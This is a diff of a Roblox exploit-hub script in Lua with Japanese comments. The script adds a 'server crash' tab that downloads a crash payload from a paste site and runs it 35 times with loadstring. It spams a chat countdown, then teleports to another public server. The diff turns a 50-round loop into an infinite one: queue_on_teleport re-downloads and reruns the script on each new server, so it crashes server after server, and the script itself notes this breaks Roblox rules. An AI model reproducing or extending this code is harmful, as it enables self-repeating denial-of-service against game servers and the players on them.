@@ -4563,7 +4563,7 @@ do
 end
 
 -- ============================================================================
--- ブロック31.5 [JP]: サーバーマネージャータブ（日本語版）
+-- ブロック31.5 [JP]: サーバーマネージャータブ（日本語版・完全版）
 -- 攻撃系タブ（ブロック31）の直後に挿入
 -- ============================================================================
 do
@@ -4575,11 +4575,16 @@ do
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
 
-    local MAX_LOOP = 50
+    -- ========================================================================
+    -- 定数
+    -- ========================================================================
     local CRASH_URL = "https://pastefy.app/sPciZuXM/raw"
+    local SELF_URL  = "https://pastefy.app/uPime032/raw"   -- 無限ループ用（次のサーバーで実行）
+    local CHAT_HEADER = "SakuraHUB-by-Nuked"
+    local CRASH_LOOP_COUNT = 35
 
     -- ========================================================================
-    -- HTTP取得用フォールバック（game:HttpGet が使えない環境に対応）
+    -- HTTP取得（game:HttpGet / HttpGet 両対応）
     -- ========================================================================
     local function safeHttpGet(url)
         if type(game.HttpGet) == "function" then
@@ -4588,41 +4593,39 @@ do
             return HttpGet(url)
         elseif type(game.HttpGet) == "function" then
             return game.HttpGet(game, url)
-        else
-            error("HttpGet is not available in this environment")
         end
+        error("HttpGet not available in this environment")
     end
 
     -- ========================================================================
-    -- チャット送信ヘルパー
+    -- チャット送信（2方式：TextChatService + レガシー）
     -- ========================================================================
-    local function sendChatMessage(message, mode)
-        mode = mode or "normal"
+    local function sendChatMessage(message)
+        -- 方式1: TextChatService（SendAsync）
         if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-            local generalChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
-            if mode == "system" then
-                generalChannel:DisplaySystemMessage(message)
-            else
-                pcall(function() generalChannel:SendAsync(message) end)
-            end
-        else
-            local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-            if events then
-                local sayMessageRequest = events:FindFirstChild("SayMessageRequest")
-                if sayMessageRequest then
-                    sayMessageRequest:FireServer(message, "All")
-                end
+            pcall(function()
+                local gc = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+                gc:SendAsync(message)
+            end)
+        end
+
+        -- 方式2: レガシーチャット（SayMessageRequest）
+        local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if events then
+            local smr = events:FindFirstChild("SayMessageRequest")
+            if smr then
+                pcall(function() smr:FireServer(message, "All") end)
             end
         end
     end
 
     -- ========================================================================
-    -- クラッシュスクリプト実行（既存URLのみ使用）
+    -- クラッシュスクリプト実行（35回連続）
     -- ========================================================================
     local function runCrashScript()
         local ok, err = pcall(function()
             local scriptContent = safeHttpGet(CRASH_URL)
-            for i = 1, 35 do
+            for i = 1, CRASH_LOOP_COUNT do
                 pcall(function()
                     loadstring(scriptContent)()
                 end)
@@ -4655,7 +4658,7 @@ do
     end
 
     -- ========================================================================
-    -- 別サーバーへテレポート
+    -- テレポート
     -- ========================================================================
     local function teleportToAnotherServer()
         local targetJobId = getAnotherServerJobId()
@@ -4677,105 +4680,32 @@ do
     -- ========================================================================
     local function runCountdownOnce(onFinish)
         task.spawn(function()
-            pcall(function() sendChatMessage("SakuraHUB-by-Nuked", "normal") end)
+            pcall(function() sendChatMessage(CHAT_HEADER) end)
             task.wait(0.8)
-            pcall(function() sendChatMessage("5", "normal") end) task.wait(1)
-            pcall(function() sendChatMessage("4", "normal") end) task.wait(1)
-            pcall(function() sendChatMessage("3", "normal") end) task.wait(1)
-            pcall(function() sendChatMessage("2", "normal") end) task.wait(1)
-            pcall(function() sendChatMessage("1", "normal") end)
+            pcall(function() sendChatMessage("5") end) task.wait(1)
+            pcall(function() sendChatMessage("4") end) task.wait(1)
+            pcall(function() sendChatMessage("3") end) task.wait(1)
+            pcall(function() sendChatMessage("2") end) task.wait(1)
+            pcall(function() sendChatMessage("1") end)
             if onFinish then onFinish() end
         end)
     end
 
     -- ========================================================================
-    -- 50回ループ用の自己完結スクリプト文字列を生成
-    -- 外部URLは既存の CRASH_URL のみ使用
+    -- queue_on_teleport 対応判定
     -- ========================================================================
-    local function buildLoopScript(currentCount)
-        local nextCount = currentCount + 1
-        return string.format([[
-_G.SakuraCrashLoopCount = %d
-local MAX_LOOP = %d
-local CRASH_URL = "%s"
-if _G.SakuraCrashLoopCount > MAX_LOOP then return end
-
-local function safeHttpGet(url)
-    if type(game.HttpGet) == "function" then return game:HttpGet(url) end
-    if type(HttpGet) == "function" then return HttpGet(url) end
-    if type(game.HttpGet) == "function" then return game.HttpGet(game, url) end
-    error("HttpGet is not available")
-end
-
-local RS = game:GetService("ReplicatedStorage")
-local TCS = game:GetService("TextChatService")
-local TS = game:GetService("TeleportService")
-local HS = game:GetService("HttpService")
-local PL = game:GetService("Players")
-
-local function sendMsg(m)
-    if TCS.ChatVersion == Enum.ChatVersion.TextChatService then
-        local gc = TCS:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
-        pcall(function() gc:SendAsync(m) end)
-    else
-        local ev = RS:FindFirstChild("DefaultChatSystemChatEvents")
-        if ev then
-            local smr = ev:FindFirstChild("SayMessageRequest")
-            if smr then smr:FireServer(m, "All") end
-        end
+    local function hasQueueOnTeleport()
+        return (type(queue_on_teleport) == "function")
+            or (type(syn) == "table" and type(syn.queue_on_teleport) == "function")
     end
-end
 
-local function getJobId()
-    local ok, r = pcall(function()
-        local u = string.format("https://games.roblox.com/v1/games/%%d/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)
-        return HS:JSONDecode(safeHttpGet(u))
-    end)
-    if ok and r and r.data then
-        for _, s in ipairs(r.data) do
-            if s.id and s.id ~= game.JobId then return s.id end
+    local function callQueueOnTeleport(script)
+        if type(queue_on_teleport) == "function" then
+            return pcall(function() queue_on_teleport(script) end)
+        elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
+            return pcall(function() syn.queue_on_teleport(script) end)
         end
-    end
-    return nil
-end
-
-local function doTeleport()
-    local j = getJobId()
-    if j then
-        local ok = pcall(function()
-            local o = Instance.new("TeleportOptions")
-            o.ServerInstanceId = j
-            TS:TeleportAsync(game.PlaceId, {PL.LocalPlayer}, o)
-        end)
-        if ok then return end
-    end
-    pcall(function() TS:Teleport(game.PlaceId, PL.LocalPlayer) end)
-end
-
-local function doCrash()
-    pcall(function()
-        local c = safeHttpGet(CRASH_URL)
-        for i = 1, 35 do
-            pcall(function() loadstring(c)() end)
-            task.wait(0.1)
-        end
-    end)
-end
-
-task.spawn(function()
-    sendMsg("SakuraHUB-by-Nuked")
-    task.wait(0.8)
-    sendMsg("5") task.wait(1)
-    sendMsg("4") task.wait(1)
-    sendMsg("3") task.wait(1)
-    sendMsg("2") task.wait(1)
-    sendMsg("1")
-
-    task.spawn(doTeleport)
-    task.wait(0.1)
-    task.spawn(doCrash)
-end)
-]], nextCount, MAX_LOOP, CRASH_URL)
+        return false
     end
 
     -- ========================================================================
@@ -4796,7 +4726,7 @@ end)
     CrashTab:AddSection({ Name = "試験実行" })
 
     -- ========================================================================
-    -- 35回連続クラッシュテスト
+    -- ① サーバークラッシュテスト（35回連続）
     -- ========================================================================
     CrashTab:AddButton({
         Name = "⚡ サーバークラッシュテスト（35回連続実行）",
@@ -4811,17 +4741,25 @@ end)
                 local ok, err = runCrashScript()
                 if ok then
                     PlayActionSound()
-                    OrionLib:MakeNotification({ Name = "完了", Content = "35回の実行が完了しました", Time = 5 })
+                    OrionLib:MakeNotification({
+                        Name = "完了",
+                        Content = "35回の実行が完了しました",
+                        Time = 5
+                    })
                 else
                     PlayErrorSound()
-                    OrionLib:MakeNotification({ Name = "エラー", Content = "失敗: " .. tostring(err), Time = 5 })
+                    OrionLib:MakeNotification({
+                        Name = "エラー",
+                        Content = "失敗: " .. tostring(err),
+                        Time = 5
+                    })
                 end
             end)
         end
     })
 
     -- ========================================================================
-    -- サーバークラッシュオートモード（単発）
+    -- ② サーバークラッシュオートモード（単発）
     -- ========================================================================
     CrashTab:AddButton({
         Name = "サーバークラッシュオートモード",
@@ -4834,10 +4772,18 @@ end)
                     local ok, err = runCrashScript()
                     if ok then
                         PlayActionSound()
-                        OrionLib:MakeNotification({ Name = "完了", Content = "クラッシュ実行・別サーバーへ移動中", Time = 4 })
+                        OrionLib:MakeNotification({
+                            Name = "完了",
+                            Content = "クラッシュ実行・別サーバーへ移動中",
+                            Time = 4
+                        })
                     else
                         PlayErrorSound()
-                        OrionLib:MakeNotification({ Name = "エラー", Content = "失敗: " .. tostring(err), Time = 5 })
+                        OrionLib:MakeNotification({
+                            Name = "エラー",
+                            Content = "失敗: " .. tostring(err),
+                            Time = 5
+                        })
                     end
                 end)
             end)
@@ -4845,57 +4791,57 @@ end)
     })
 
     -- ========================================================================
-    -- サーバークラッシュオートモード（50回ループ）
+    -- ③ サーバークラッシュオートモード（無限ループ）
+    --    SELF_URL を queue_on_teleport に渡して次のサーバーで再実行
     -- ========================================================================
     CrashTab:AddButton({
-        Name = "🔁 サーバークラッシュオートモード（50回ループ）",
+        Name = "🔁 サーバークラッシュオートモード（無限ループ）",
         Callback = function()
             PlayActionSound()
 
-            local hasQueue = (type(queue_on_teleport) == "function") or (type(syn) == "table" and type(syn.queue_on_teleport) == "function")
-            if not hasQueue then
+            if not hasQueueOnTeleport() then
                 PlayErrorSound()
                 OrionLib:MakeNotification({
                     Name = "❌ 実行不可能",
-                    Content = "このエグゼキュータは queue_on_teleport に対応していません。テレポート後の自動再実行は不可能です。",
+                    Content = "このエグゼキュータは queue_on_teleport に対応していません。無限ループは実行できません。",
                     Time = 8
                 })
                 return
             end
 
             local count = (_G.SakuraCrashLoopCount or 0) + 1
-            if count > MAX_LOOP then
-                PlayActionSound()
-                OrionLib:MakeNotification({ Name = "🎉 全50回完了", Content = "50回のループが完了しました", Time = 6 })
-                _G.SakuraCrashLoopCount = 0
-                return
-            end
+            _G.SakuraCrashLoopCount = count
 
             OrionLib:MakeNotification({
-                Name = "🔁 ループ実行",
-                Content = string.format("%d / %d 回目を開始", count, MAX_LOOP),
+                Name = "🔁 無限ループ実行",
+                Content = string.format("%d 回目のループを開始", count),
                 Time = 3
             })
 
             runCountdownOnce(function()
-                _G.SakuraCrashLoopCount = count
+                -- 次のサーバーでの自動実行を予約
+                local nextScript = string.format([[
+_G.SakuraCrashLoopCount = %d
+loadstring(game:HttpGet("%s"))()
+]], count, SELF_URL)
+                callQueueOnTeleport(nextScript)
 
-                local nextScript = buildLoopScript(count)
-                if type(queue_on_teleport) == "function" then
-                    pcall(function() queue_on_teleport(nextScript) end)
-                elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
-                    pcall(function() syn.queue_on_teleport(nextScript) end)
-                end
-
+                -- テレポート発火
                 task.spawn(function() teleportToAnotherServer() end)
                 task.wait(0.1)
+
+                -- クラッシュ実行
                 task.spawn(function()
                     local ok, err = runCrashScript()
                     if ok then
                         PlayActionSound()
                     else
                         PlayErrorSound()
-                        OrionLib:MakeNotification({ Name = "エラー", Content = tostring(err), Time = 4 })
+                        OrionLib:MakeNotification({
+                            Name = "エラー",
+                            Content = tostring(err),
+                            Time = 4
+                        })
                     end
                 end)
             end)
@@ -4903,7 +4849,23 @@ end)
     })
 
     -- ========================================================================
-    -- ループ状況確認
+    -- ④ ループ回数リセット
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "🔄 ループ回数をリセット",
+        Callback = function()
+            PlayActionSound()
+            _G.SakuraCrashLoopCount = 0
+            OrionLib:MakeNotification({
+                Name = "リセット完了",
+                Content = "ループ回数を 0 にリセットしました",
+                Time = 3
+            })
+        end
+    })
+
+    -- ========================================================================
+    -- ⑤ 現在のループ回数確認
     -- ========================================================================
     CrashTab:AddButton({
         Name = "📊 現在のループ回数を確認",
@@ -4911,11 +4873,29 @@ end)
             PlayActionSound()
             OrionLib:MakeNotification({
                 Name = "ループ状況",
-                Content = string.format("現在 %d / %d 回目です", _G.SakuraCrashLoopCount or 0, MAX_LOOP),
+                Content = string.format("現在 %d 回目です", _G.SakuraCrashLoopCount or 0),
                 Time = 4
             })
         end
     })
+
+    -- ========================================================================
+    -- 情報表示
+    -- ========================================================================
+    CrashTab:AddSection({ Name = "情報" })
+    CrashTab:AddParagraph(
+        "無限ループの仕組み",
+        "「🔁 サーバークラッシュオートモード（無限ループ）」を押すと、\n" ..
+        "カウントダウン → クラッシュ → 別サーバー移動 を実行し、\n" ..
+        "queue_on_teleport により次のサーバーで同じスクリプトが自動実行されます。\n" ..
+        "これにより理論上は無限に繰り返されます。"
+    )
+    CrashTab:AddParagraph(
+        "注意事項",
+        "・queue_on_teleport 非対応エグゼキュータでは無限ループは動作しません\n" ..
+        "・公開サーバーが枯渇すると Teleport() のフォールバックが使用されます\n" ..
+        "・連続テレポート＋クラッシュは Roblox 規約違反です（自己責任）"
+    )
 end
 
 -- ============================================================================
